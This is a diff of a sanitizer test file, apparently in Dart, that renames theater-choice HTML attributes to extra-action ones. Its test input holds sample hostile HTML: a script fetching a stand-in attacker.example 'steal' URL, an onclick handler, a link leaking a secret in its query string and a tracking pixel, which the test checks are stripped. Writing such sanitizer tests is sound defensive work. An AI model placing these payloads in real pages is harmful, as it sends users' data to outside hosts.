@@ -8,10 +8,10 @@ void main() {
 <style>.panel { color: red; }</style>
 <script>fetch('https://attacker.example/steal')</script>
 <button onclick="steal()" data-action="继续">继续</button>
-<div data-theater-group="main" data-choice-mode="multi">
-  <button data-theater-choice="water" data-theater-label="先给猫喂水">喂水</button>
+<div id="water" data-extra-group="main" hidden>
+  <button data-extra-action="reveal" data-extra-target="water">喂水</button>
 </div>
-<button data-theater-submit="继续小剧场">继续小剧场</button>
+<button data-extra-action="reset">重玩番外</button>
 <a href="https://attacker.example/?secret=x">外链</a>
 <img src="https://attacker.example/pixel.png">
 <img src="data:image/png;base64,AAAA">
@@ -28,8 +28,8 @@ void main() {
     expect(result, isNot(contains('attacker.example')));
     expect(result, isNot(contains('<iframe')));
     expect(result, contains('data-action="继续"'));
-    expect(result, contains('data-theater-choice="water"'));
-    expect(result, contains('data-theater-submit="继续小剧场"'));
+    expect(result, contains('data-extra-target="water"'));
+    expect(result, contains('data-extra-action="reset"'));
     expect(result, contains('data:image/png;base64,AAAA'));
     expect(result, contains('window.parent.postMessage'));
   });
